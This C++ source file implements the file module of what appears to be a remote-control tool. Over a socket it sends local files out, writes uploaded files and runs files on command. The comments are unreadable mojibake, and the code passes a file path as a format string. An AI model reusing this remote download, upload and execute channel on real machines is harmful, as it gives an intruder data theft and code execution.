#include "StdAfx.h"
#include "FileInfo.h"

CFileInfo::CFileInfo(void)
{
}

CFileInfo::~CFileInfo(void)
{
}

void CFileInfo::SendDownFileInfo( IN wchar_t* pPath, IN SOCKET sock )
{
	const int nBufSize = 512;  //�ļ����С
	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_DOWNLOAD;    //�ļ�����
    DOWNFILEDATA_S tagDownFileData;
	memset(&tagDownFileData, 0, sizeof(DOWNFILEDATA_S));

	CFile file(pPath, CFile::modeRead);
	ULONGLONG ullSize = file.GetLength();  //�ļ���С
	bool bSuccess = true;
	tagDownFileData.bFlag = false;
	if (ullSize < nBufSize) //�ļ�����һ����
	{
		file.Read((char*)tagDownFileData.context, (UINT)ullSize);
		tagDownFileData.size = (UINT)ullSize;
		tagDownFileData.nCount = 0;
		memcpy((char*)tagMsgInfo.context, (char*)&tagDownFileData, sizeof(DOWNFILEDATA_S));
		m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
	} 
	else  //�ֿ鷢��
	{
		ULONGLONG ullCount = ullSize / nBufSize + 1;   //���͵Ĵ���
		int ullLastSize = ullSize % nBufSize;  //���һ�δ�����ֽ���
		for (int i = 0; i < ullCount; i++)
		{
			memset(tagDownFileData.context, 0, sizeof(tagDownFileData.context));
			if ( i == ullCount - 1)  //���һ�δ����ļ�
			{
				file.Read(tagDownFileData.context, ullLastSize);
				tagDownFileData.size = ullLastSize;
			}
			else
			{
				file.Read(tagDownFileData.context, nBufSize);
				tagDownFileData.size = nBufSize;
			}
			tagDownFileData.nCount = i;
			memcpy((char*)tagMsgInfo.context, (char*)&tagDownFileData, sizeof(DOWNFILEDATA_S));
			m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
		}
	}
	tagDownFileData.bFlag = true;  //�ļ��������
	memcpy((char*)tagMsgInfo.context, (char*)&tagDownFileData, sizeof(DOWNFILEDATA_S));
	m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}

void CFileInfo::CreateUpLoadFile( IN wchar_t* pPath)
{
	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_UPLOAD;       //�ļ��ϴ�
	m_hFile = CreateFile(pPath,
		                 GENERIC_WRITE | GENERIC_READ,
						 FILE_SHARE_READ | FILE_SHARE_WRITE,
						 NULL, CREATE_ALWAYS,
						 FILE_ATTRIBUTE_NORMAL,
						 NULL);
	if (INVALID_HANDLE_VALUE == m_hFile)
	{
		printf("Create File Failed !\n");
	}
	else
	{
		printf("Create File Success !\n");
	}
}

void CFileInfo::WriteDataInFile( IN DOWNFILEDATA_S tagDownFileDate )
{
	CFile file(m_hFile);
	if (false == tagDownFileDate.bFlag)
	{
		file.Write((char*)tagDownFileDate.context, tagDownFileDate.size);  //д���ļ�
	}
	else
	{
		file.Close();
		CloseHandle(m_hFile);
	}
}

void CFileInfo::ExecuteFile(IN wchar_t* pFilePath, IN SOCKET sock)
{
	FILEEXECINFO_S tagFileExec;
	memset(&tagFileExec, 0, sizeof(FILEEXECINFO_S));
	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_FILEEXEC;  //�ļ�ִ��
	HINSTANCE hExecRet = ::ShellExecute(NULL, _T("open"), pFilePath, NULL, NULL, SW_SHOWNORMAL);
	if ((DWORD)hExecRet > 32)
	{
		tagFileExec.bSuccess = true;
	}
	else
	{
		tagFileExec.bSuccess = false;
	}
	wsprintfW(tagFileExec.szFilePath, pFilePath);
	memcpy((char*)tagMsgInfo.context, (char*)&tagFileExec, sizeof(FILEEXECINFO_S));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}

void CFileInfo::SendAttriInfo( IN ATTRIBUTE_S tagAttribute, IN SOCKET sock )
{
	ATTRIBUTE_S tagArrti;
	memset(&tagArrti, 0, sizeof(ATTRIBUTE_S));
	tagArrti.nType      = tagAttribute.nType;    //����
    wcscpy_s(tagArrti.szFilePath, tagAttribute.szFilePath);   //�ļ�����·��
	wcscpy_s(tagArrti.szFileName, tagAttribute.szFileName);  //�ļ�������
 
	CString strFilePath = _T("");
	strFilePath.Format(_T("%s"), tagAttribute.szFilePath);
	CString strFileName = _T("");
	strFileName.Format(_T("%s"), tagAttribute.szFileName);
	strFilePath += strFileName;    //C:\windows\test(.txt)
	HANDLE hDir = CreateFile(strFilePath, 
		                      GENERIC_READ, 
		                      FILE_SHARE_READ|FILE_SHARE_WRITE,
							  NULL,
							  OPEN_EXISTING,
							  NULL, 
							  NULL);
	if (INVALID_HANDLE_VALUE != hDir)
	{
		FILETIME lpCreationTime; // �ļ��еĴ���ʱ��
		FILETIME lpLastAccessTime; // ���ļ��е��������ʱ��
		FILETIME lpLastWriteTime; // �ļ��е�����޸�ʱ��
		if (GetFileTime(hDir, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime))
		{
			FILETIME ftime;
			FileTimeToLocalFileTime(&lpCreationTime, &ftime); // ת���ɱ���ʱ��
			FileTimeToSystemTime(&ftime, &tagArrti.sysCreateTime); // ת����ϵͳʱ���ʽ

			FileTimeToLocalFileTime(&lpLastAccessTime, &ftime);    //����ʱ��
			FileTimeToSystemTime(&ftime, &tagArrti.sysVisitTime);

			FileTimeToLocalFileTime(&lpLastWriteTime, &ftime);   //����޸��¼�
			FileTimeToSystemTime(&ftime, &tagArrti.sysModifyTime);
		}
	}
	CloseHandle(hDir);
	if (FILE_ATTR == tagArrti.nType)  //�ļ�
	{
		CFileStatus rStatus;
		if(CFile::GetStatus(strFilePath,rStatus))
		{
			//�ж��Ƿ�ֻ��
			if((rStatus.m_attribute & 0x01) == 0x01)
			{
				tagArrti.bReadOnly = true;
			}
			else
			{
				tagArrti.bReadOnly = false;
			}
			//�ж��Ƿ�����
			if((rStatus.m_attribute & 0x02) == 0x02)
			{
				tagArrti.bHide = true;
			}
			else
			{
				tagArrti.bHide = false;
			}
			//�ж��Ƿ�浵
			if((rStatus.m_attribute & 0x20) == 0x20)
			{
				tagArrti.bArchive = true;
			}
			else
			{
				tagArrti.bArchive = false;
			}
			//�ж��Ƿ���ϵͳ�ļ�
			if((rStatus.m_attribute & 0x04) == 0x04)
			{
				tagArrti.bSystem = true;
			}
			else
			{
				tagArrti.bSystem =false;
			}
		}
	}
	else if (FOLDER_ATTR == tagArrti.nType)  //�ļ���(��ʱ�������ҵ����ʵķ�����ȡ�ļ��е�����)
	{
		tagArrti.bArchive = false;
		tagArrti.bReadOnly = false;
		tagArrti.bHide = false;
		tagArrti.bSystem = false;
	}

	MSGINFO_S tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO_S));
	tagMsgInfo.Msg_id = CMD_ATTRIBUTE;
	memcpy((char*)tagMsgInfo.context, (char*)&tagArrti, sizeof(ATTRIBUTE_S));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(sock, (char*)&tagMsgInfo, sizeof(MSGINFO_S), &bSuccess);
}